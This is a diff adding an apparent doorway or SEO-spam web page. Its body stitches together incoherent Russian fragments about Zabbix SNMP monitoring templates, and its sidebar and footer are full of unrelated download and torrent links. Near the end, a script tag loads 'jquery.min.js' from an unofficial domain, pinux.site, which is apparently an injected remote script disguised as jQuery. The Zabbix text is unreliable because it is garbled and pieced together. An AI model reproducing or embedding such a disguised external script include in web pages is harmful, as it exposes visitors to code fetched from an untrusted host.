@@ -1,0 +1,144 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Zabbix шаблоны snmp - xaeleikaih.signac.io</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">xaeleikaih.signac.io</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Zabbix шаблоны snmp</h2>
+                            </header>
+                            <p>Видео и подробное описание установки и настройки Zabbix 3.4, а также установка агентов на linux. Для многих устройств нет шаблонов в Zabbix,  Напрямую через SNMP запрашивать по нужному ключу не получиться тк при мониторинге упавших каналов имя порта никак. Разбираем возможности и достоинства пяти лучших бесплатных систем мониторинга. Импорт и присоединение готовых шаблонов NetPing в Zabbix. Zabbix templates для устройств NetPing. Обзор возможностей бесплатных программ для мониторинга сетевого оборудования и серверов. Оригинальный шаблон Zabbix для устройств SNMP включает поддержку протокола версии. 
+Блог о системном администрировании. Статьи о Linux, Windows, СХД NetApp и виртуализации. Требуется шаблон Zabbix для устройства,  Документ MIB (только для устройств SNMP) Временный доступ к устройству или системе для тестирования. Базовая настройка CentOS 7 для работы с любым функционалом. Приведены практические советы. Update: Выложил на Github. https://github.com/rmavrichev/zabbix Для желающих 3й версии - адаптированные шаблоны, файл zbx3_Basic_templates.xml  Включает: Basic App MySQL Basic App Zabbix Agent Basic App Zabbix Proxy Basic App Zabbix. Узнайте, как контролировать коммутатор Cisco с помощью Zabbix и SNMP. В нашем учебном пособии мы расскажем вам все шаги, необходимые для мониторинга коммутатора Cisco. Я создал шаблон Zabbix 2.x для мониторинга CheckPoint продуктов через SNMP. Этот шаблон использует CheckPoint. Мониторинг принтеров HP, Kyocera, Brother через snmp в zabbix.  Спасибо за инфу! а для Canon принтеров есть шаблон? имею Zabbix 3.4.14 ? что-то не нашел.:). 
+Мониторинг с помощью Zabbix - это просто! В статье мы расскажем как поставить маршрутизатор Mikrotik на мониторинг Repository of Templates, Addons and Modules for Zabbix. Поскольку стандартные шаблоны, которые мне попадались на просторах интернета мне не подошли, особенно потому что или собирали не те данные, или вообще были. Улучшенный мониторинг Mikrotik через Zabbix,мониторим Mikrotik по snmp в Zabbix. В данной заметке мы рассмотрим, как можно производить мониторинг прокси-сервера Squid через Zabbix сервер по протоколу SNMP. Предполагается, что у Вас уже имеется. Делюсь шаблоном для мониторинга состояния маршрутизаторов CISCO, zabbix 2.4 Работа с устройством реализована по протоколу SNMP и тут есть ряд подводных камней, но самый. НАСТРОЙКА ZABBIX. Первым делом необходимо добавить шаблон для мониторинга MikroTik в Zabbix. Прикручиваем MIB к Zabbix. Сам по себе Zabbix не поддерживает MIB (Management Information Base), а готовые шаблоны есть отнюдь не для всех устройств. 
+Практический мониторинг управляемого коммутатора используя zabbix и snmp.  Шаблон мы добавили, начинается самое интересное. Началось строительство FTTB и появилось новое оборудование производителя Edge-core. Естественно захотелось прикрутить новое железо к Zabbix. Ранее я поступал просто. Пример мониторинга серверной комнаты на основе Zabbix и UniPing v3 Данная статья рассказывает о настройке мониторинга датчиков сетевого устройства UniPing v3 в системе. Давно хотел выложить данный шаблон, да все никак времени не мог выделить, данный шаблон подойдет в принципе под любой свитч с поддержкой snmp, только некоторые. Для желающих 3й версии - адаптированные шаблоны. Включает: Basic App MySQL Basic App Zabbix Agent Basic App Zabbix Proxy Basic App Zabbix Server Basic Cisco SNMP with traps Basic IBM - IMM2 SNMP Basic ICMP Network Device Basic Juniper Установленный патч для работы динамических SNMP-индексов (только для Zabbix 2.0 и ниже, в новых версиях данный патч реализован «из коробки»). zabbix 1.8, net-snmp 5.6.2  подключен итем SNMP trap fallback через шаблон Template SNMP trap fallback Type: Snmp trap key: snmptrap.fallback Type of information: Log History storage period (in days):. Zabbix настройка шаблонов проверки ICMP, . Шаблон проверки доступности по ICMP Template ping_loss_60s . SNMP OID: IF-MIB::ifInOctets.2, SNMP community: {$SNMP_COMMUNITY} - в макросах указываем нужное 
+Zabbix SNMP - после того,  Тогда нужно в начале создать вначале шаблон/шаблоны, далее внутри шаблона создать элементы данных и графики. Создание шаблонов устройств Cisco для последующего добавления в Zabbix для мониторинга. Несколько шаблонов для Zabbix для мониторинга Windows. Блог о Linux и Windows  Практика SNMP. Но что делать, когда нельзя (или нет желания) установить агент. Так случилось, что на просторах интернета не нашлось ни одного шаблона под Zabbix, для мониторинга коммутаторов Zyxel GS1910-24. Zabbix — свободная система мониторинга и отслеживания статусов компьютерной сети, серверов и сетевого оборудования. Триггеры, шаблоны для Zabbix. Установка. </p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="mia0e-xiaomi-miband-2.html">Xiaomi miband 2</a></li>
+                                <li><a href="mia0e-otkrytye-porty-dlya-torrenta.html">Открытые порты для торрента</a></li>
+                                <li><a href="mia0e-film-zapret-na-lyubov.html">Фильм запрет на любовь</a></li>
+                                <li><a href="mia0e-tekst-pesni-love-of-my-life-queen.html">Текст песни love of my life queen</a></li>
+                                <li><a href="mia0e-verka-serdyuchka-dolche-gabbana-minusovka-original.html">Верка сердючка дольче габбана минусовка оригинал</a></li>
+                                <li><a href="mia0e-ustanovit-blokirator-reklamy-dlya-yandeks-brauzera.html">Установить блокиратор рекламы для яндекс браузера</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"></ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="mia0e-kratkoe-soderzhanie-kot-v-sapogah-deniskiny-rasskazy.html">Краткое содержание кот в сапогах денискины рассказы</a></li>
+                                            <li><a href="mia0e-skachat-prostoy-simulyator-samoleta.html">Скачать простой симулятор самолета</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="mia0e-skachat-roboboks-na-android.html">Скачать робобокс на андроид</a></li>
+                                            <li><a href="mia0e-pesni-nebo-pomozhet-nam-minusovka.html">Песни небо поможет нам минусовка</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="mia0e-skachat-pesni-iz-molodezhki-3-sezon-besplatno.html">Скачать песни из молодежки 3 сезон бесплатно</a></li>
+                                            <li><a href="mia0e-skachat-igru-assassins-creed-brotherhood-na-telefon.html">Скачать игру assassins creed brotherhood на телефон</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="mia0e-lyudi-iks-nachalo-rosomaha-2-skachat-torrent.html">Люди икс начало росомаха 2 скачать торрент</a></li>
+                                            <li><a href="mia0e-kratkoe-soderzhanie-priklyuchenie-neznayki.html">Краткое содержание приключение незнайки</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
